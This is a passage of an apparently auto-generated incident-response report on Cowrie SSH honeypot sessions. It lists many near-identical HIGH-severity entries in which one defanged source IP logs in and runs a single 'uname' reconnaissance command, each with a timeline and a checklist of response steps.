- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41c58111fa23

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:28 |
| **Last Seen** | 2026-08-20 19:28 |
| **Session Duration** | 24s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:28:07` | `cowrie.session.connect` |
| `2026-08-20 19:28:08` | `cowrie.client.version` |
| `2026-08-20 19:28:13` | `cowrie.client.kex` |
| `2026-08-20 19:28:23` | `cowrie.login.success` |
| `2026-08-20 19:28:28` | `cowrie.session.params` |
| `2026-08-20 19:28:28` | `cowrie.command.input` |
| `2026-08-20 19:28:30` | `cowrie.log.closed` |
| `2026-08-20 19:28:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-265f6bb45d59

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:28 |
| **Last Seen** | 2026-08-20 19:28 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:28:08` | `cowrie.session.connect` |
| `2026-08-20 19:28:08` | `cowrie.client.version` |
| `2026-08-20 19:28:22` | `cowrie.client.kex` |
| `2026-08-20 19:28:28` | `cowrie.login.success` |
| `2026-08-20 19:28:34` | `cowrie.session.params` |
| `2026-08-20 19:28:34` | `cowrie.command.input` |
| `2026-08-20 19:28:41` | `cowrie.log.closed` |
| `2026-08-20 19:28:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-52a0d5c1c79f

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:28 |
| **Last Seen** | 2026-08-20 19:28 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:28:08` | `cowrie.session.connect` |
| `2026-08-20 19:28:08` | `cowrie.client.version` |
| `2026-08-20 19:28:09` | `cowrie.client.kex` |
| `2026-08-20 19:28:22` | `cowrie.login.success` |
| `2026-08-20 19:28:24` | `cowrie.session.params` |
| `2026-08-20 19:28:24` | `cowrie.command.input` |
| `2026-08-20 19:28:25` | `cowrie.log.closed` |
| `2026-08-20 19:28:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04140e179d03

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:28 |
| **Last Seen** | 2026-08-20 19:28 |
| **Session Duration** | 32s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:28:08` | `cowrie.session.connect` |
| `2026-08-20 19:28:08` | `cowrie.client.version` |
| `2026-08-20 19:28:15` | `cowrie.client.kex` |
| `2026-08-20 19:28:26` | `cowrie.login.success` |
| `2026-08-20 19:28:31` | `cowrie.session.params` |
| `2026-08-20 19:28:31` | `cowrie.command.input` |
| `2026-08-20 19:28:33` | `cowrie.log.closed` |
| `2026-08-20 19:28:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8fe127217eb9

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:28 |
| **Last Seen** | 2026-08-20 19:28 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:28:08` | `cowrie.session.connect` |
| `2026-08-20 19:28:08` | `cowrie.client.version` |
| `2026-08-20 19:28:09` | `cowrie.client.kex` |
| `2026-08-20 19:28:20` | `cowrie.login.success` |
| `2026-08-20 19:28:26` | `cowrie.session.params` |
| `2026-08-20 19:28:26` | `cowrie.command.input` |
| `2026-08-20 19:28:27` | `cowrie.log.closed` |
| `2026-08-20 19:28:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53a43677172e

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:28 |
| **Last Seen** | 2026-08-20 19:28 |
| **Session Duration** | 23s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:28:09` | `cowrie.session.connect` |
| `2026-08-20 19:28:09` | `cowrie.client.version` |
| `2026-08-20 19:28:11` | `cowrie.client.kex` |
| `2026-08-20 19:28:26` | `cowrie.login.success` |
| `2026-08-20 19:28:29` | `cowrie.session.params` |
| `2026-08-20 19:28:29` | `cowrie.command.input` |
| `2026-08-20 19:28:32` | `cowrie.log.closed` |
| `2026-08-20 19:28:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b2aa1bd461b1

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:28 |
| **Last Seen** | 2026-08-20 19:28 |
| **Session Duration** | 36s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:28:11` | `cowrie.session.connect` |
| `2026-08-20 19:28:14` | `cowrie.client.version` |
| `2026-08-20 19:28:17` | `cowrie.client.kex` |
| `2026-08-20 19:28:30` | `cowrie.login.success` |
| `2026-08-20 19:28:45` | `cowrie.session.params` |
| `2026-08-20 19:28:45` | `cowrie.command.input` |
| `2026-08-20 19:28:47` | `cowrie.log.closed` |
| `2026-08-20 19:28:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ff49f6ac226

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:28 |
| **Last Seen** | 2026-08-20 19:28 |
| **Session Duration** | 29s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:28:14` | `cowrie.session.connect` |
| `2026-08-20 19:28:17` | `cowrie.client.version` |
| `2026-08-20 19:28:18` | `cowrie.client.kex` |
| `2026-08-20 19:28:28` | `cowrie.login.success` |
| `2026-08-20 19:28:34` | `cowrie.session.params` |
| `2026-08-20 19:28:34` | `cowrie.command.input` |
| `2026-08-20 19:28:42` | `cowrie.log.closed` |
| `2026-08-20 19:28:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42be772bd408

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:28 |
| **Last Seen** | 2026-08-20 19:28 |
| **Session Duration** | 27s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:28:14` | `cowrie.session.connect` |
| `2026-08-20 19:28:17` | `cowrie.client.version` |
| `2026-08-20 19:28:22` | `cowrie.client.kex` |
| `2026-08-20 19:28:27` | `cowrie.login.success` |
| `2026-08-20 19:28:32` | `cowrie.session.params` |
| `2026-08-20 19:28:32` | `cowrie.command.input` |
| `2026-08-20 19:28:40` | `cowrie.log.closed` |
| `2026-08-20 19:28:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da780451ce6f

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:28 |
| **Last Seen** | 2026-08-20 19:28 |
| **Session Duration** | 27s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:28:14` | `cowrie.session.connect` |
| `2026-08-20 19:28:17` | `cowrie.client.version` |
| `2026-08-20 19:28:21` | `cowrie.client.kex` |
| `2026-08-20 19:28:28` | `cowrie.login.success` |
| `2026-08-20 19:28:37` | `cowrie.session.params` |
| `2026-08-20 19:28:37` | `cowrie.command.input` |
| `2026-08-20 19:28:41` | `cowrie.log.closed` |
| `2026-08-20 19:28:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad43eaa77185

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:28 |
| **Last Seen** | 2026-08-20 19:28 |
| **Session Duration** | 27s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:28:14` | `cowrie.session.connect` |
| `2026-08-20 19:28:17` | `cowrie.client.version` |
| `2026-08-20 19:28:18` | `cowrie.client.kex` |
| `2026-08-20 19:28:28` | `cowrie.login.success` |
| `2026-08-20 19:28:39` | `cowrie.session.params` |
| `2026-08-20 19:28:39` | `cowrie.command.input` |
| `2026-08-20 19:28:41` | `cowrie.log.closed` |
| `2026-08-20 19:28:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26793e799cbb

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:28 |
| **Last Seen** | 2026-08-20 19:28 |
| **Session Duration** | 32s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:28:14` | `cowrie.session.connect` |
| `2026-08-20 19:28:17` | `cowrie.client.version` |
| `2026-08-20 19:28:22` | `cowrie.client.kex` |
| `2026-08-20 19:28:40` | `cowrie.login.success` |
| `2026-08-20 19:28:43` | `cowrie.session.params` |
| `2026-08-20 19:28:43` | `cowrie.command.input` |
| `2026-08-20 19:28:46` | `cowrie.log.closed` |
| `2026-08-20 19:28:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-68daf1ef4d86

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:28 |
| **Last Seen** | 2026-08-20 19:28 |
| **Session Duration** | 25s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:28:14` | `cowrie.session.connect` |
| `2026-08-20 19:28:17` | `cowrie.client.version` |
| `2026-08-20 19:28:18` | `cowrie.client.kex` |
| `2026-08-20 19:28:27` | `cowrie.login.success` |
| `2026-08-20 19:28:30` | `cowrie.session.params` |
| `2026-08-20 19:28:30` | `cowrie.command.input` |
| `2026-08-20 19:28:34` | `cowrie.log.closed` |
| `2026-08-20 19:28:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7efc8e78ef29

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:28 |
| **Last Seen** | 2026-08-20 19:28 |
| **Session Duration** | 27s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:28:14` | `cowrie.session.connect` |
| `2026-08-20 19:28:17` | `cowrie.client.version` |
| `2026-08-20 19:28:21` | `cowrie.client.kex` |
| `2026-08-20 19:28:30` | `cowrie.login.success` |
| `2026-08-20 19:28:37` | `cowrie.session.params` |
| `2026-08-20 19:28:37` | `cowrie.command.input` |
| `2026-08-20 19:28:41` | `cowrie.log.closed` |
| `2026-08-20 19:28:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-580b0e00319a

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:28 |
| **Last Seen** | 2026-08-20 19:28 |
| **Session Duration** | 29s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:28:16` | `cowrie.session.connect` |
| `2026-08-20 19:28:17` | `cowrie.client.version` |
| `2026-08-20 19:28:21` | `cowrie.client.kex` |
| `2026-08-20 19:28:31` | `cowrie.login.success` |
| `2026-08-20 19:28:42` | `cowrie.session.params` |
| `2026-08-20 19:28:42` | `cowrie.command.input` |
| `2026-08-20 19:28:44` | `cowrie.log.closed` |
| `2026-08-20 19:28:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce835498d864

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:28 |
| **Last Seen** | 2026-08-20 19:28 |
| **Session Duration** | 27s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:28:16` | `cowrie.session.connect` |
| `2026-08-20 19:28:17` | `cowrie.client.version` |
| `2026-08-20 19:28:22` | `cowrie.client.kex` |
| `2026-08-20 19:28:27` | `cowrie.login.success` |
| `2026-08-20 19:28:41` | `cowrie.session.params` |
| `2026-08-20 19:28:41` | `cowrie.command.input` |
| `2026-08-20 19:28:44` | `cowrie.log.closed` |
| `2026-08-20 19:28:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8591e1945f07

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:28 |
| **Last Seen** | 2026-08-20 19:28 |
| **Session Duration** | 30s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:28:16` | `cowrie.session.connect` |
| `2026-08-20 19:28:17` | `cowrie.client.version` |
| `2026-08-20 19:28:22` | `cowrie.client.kex` |
| `2026-08-20 19:28:32` | `cowrie.login.success` |
| `2026-08-20 19:28:42` | `cowrie.session.params` |
| `2026-08-20 19:28:42` | `cowrie.command.input` |
| `2026-08-20 19:28:47` | `cowrie.log.closed` |
| `2026-08-20 19:28:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f6a9a6e68299

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:28 |
| **Last Seen** | 2026-08-20 19:28 |
| **Session Duration** | 27s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:28:16` | `cowrie.session.connect` |
| `2026-08-20 19:28:17` | `cowrie.client.version` |
| `2026-08-20 19:28:21` | `cowrie.client.kex` |
| `2026-08-20 19:28:28` | `cowrie.login.success` |
| `2026-08-20 19:28:39` | `cowrie.session.params` |
| `2026-08-20 19:28:39` | `cowrie.command.input` |
| `2026-08-20 19:28:42` | `cowrie.log.closed` |
| `2026-08-20 19:28:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-230d1c0f1d24

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:28 |
| **Last Seen** | 2026-08-20 19:29 |
| **Session Duration** | 53s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:28:21` | `cowrie.session.connect` |
| `2026-08-20 19:28:23` | `cowrie.client.version` |
| `2026-08-20 19:28:23` | `cowrie.client.kex` |
| `2026-08-20 19:28:28` | `cowrie.login.success` |
| `2026-08-20 19:28:40` | `cowrie.session.params` |
| `2026-08-20 19:28:40` | `cowrie.command.input` |
| `2026-08-20 19:29:11` | `cowrie.log.closed` |
| `2026-08-20 19:29:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f4af6b73978a

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:28 |
| **Last Seen** | 2026-08-20 19:28 |
| **Session Duration** | 25s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:28:21` | `cowrie.session.connect` |
| `2026-08-20 19:28:23` | `cowrie.client.version` |
| `2026-08-20 19:28:23` | `cowrie.client.kex` |
| `2026-08-20 19:28:40` | `cowrie.login.success` |
| `2026-08-20 19:28:44` | `cowrie.session.params` |
| `2026-08-20 19:28:44` | `cowrie.command.input` |
| `2026-08-20 19:28:46` | `cowrie.log.closed` |
| `2026-08-20 19:28:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3684491a15c9

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:28 |
| **Last Seen** | 2026-08-20 19:29 |
| **Session Duration** | 69s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:28:21` | `cowrie.session.connect` |
| `2026-08-20 19:28:23` | `cowrie.client.version` |
| `2026-08-20 19:29:06` | `cowrie.client.kex` |
| `2026-08-20 19:29:21` | `cowrie.login.success` |
| `2026-08-20 19:29:28` | `cowrie.session.params` |
| `2026-08-20 19:29:28` | `cowrie.command.input` |
| `2026-08-20 19:29:31` | `cowrie.log.closed` |
| `2026-08-20 19:29:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e102cf7d5378

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:28 |
| **Last Seen** | 2026-08-20 19:28 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:28:21` | `cowrie.session.connect` |
| `2026-08-20 19:28:23` | `cowrie.client.version` |
| `2026-08-20 19:28:23` | `cowrie.client.kex` |
| `2026-08-20 19:28:31` | `cowrie.login.success` |
| `2026-08-20 19:28:46` | `cowrie.session.params` |
| `2026-08-20 19:28:46` | `cowrie.command.input` |
| `2026-08-20 19:28:47` | `cowrie.log.closed` |
| `2026-08-20 19:28:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6a74f190841

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:28 |
| **Last Seen** | 2026-08-20 19:28 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:28:22` | `cowrie.session.connect` |
| `2026-08-20 19:28:23` | `cowrie.client.version` |
| `2026-08-20 19:28:23` | `cowrie.client.kex` |
| `2026-08-20 19:28:28` | `cowrie.login.success` |
| `2026-08-20 19:28:33` | `cowrie.session.params` |
| `2026-08-20 19:28:33` | `cowrie.command.input` |
| `2026-08-20 19:28:42` | `cowrie.log.closed` |
| `2026-08-20 19:28:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9eacfdfc8ead

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:28 |
| **Last Seen** | 2026-08-20 19:28 |
| **Session Duration** | 30s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:28:23` | `cowrie.session.connect` |
| `2026-08-20 19:28:23` | `cowrie.client.version` |
| `2026-08-20 19:28:26` | `cowrie.client.kex` |
| `2026-08-20 19:28:40` | `cowrie.login.success` |
| `2026-08-20 19:28:47` | `cowrie.session.params` |
| `2026-08-20 19:28:47` | `cowrie.command.input` |
| `2026-08-20 19:28:52` | `cowrie.log.closed` |
| `2026-08-20 19:28:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f0004e4a6cf

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:28 |
| **Last Seen** | 2026-08-20 19:28 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:28:23` | `cowrie.session.connect` |
| `2026-08-20 19:28:23` | `cowrie.client.version` |
| `2026-08-20 19:28:23` | `cowrie.client.kex` |
| `2026-08-20 19:28:27` | `cowrie.login.success` |
| `2026-08-20 19:28:30` | `cowrie.session.params` |
| `2026-08-20 19:28:30` | `cowrie.command.input` |
| `2026-08-20 19:28:32` | `cowrie.log.closed` |
| `2026-08-20 19:28:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7097c744e36

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:28 |
| **Last Seen** | 2026-08-20 19:28 |
| **Session Duration** | 27s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:28:26` | `cowrie.session.connect` |
| `2026-08-20 19:28:27` | `cowrie.client.version` |
| `2026-08-20 19:28:30` | `cowrie.client.kex` |
| `2026-08-20 19:28:44` | `cowrie.login.success` |
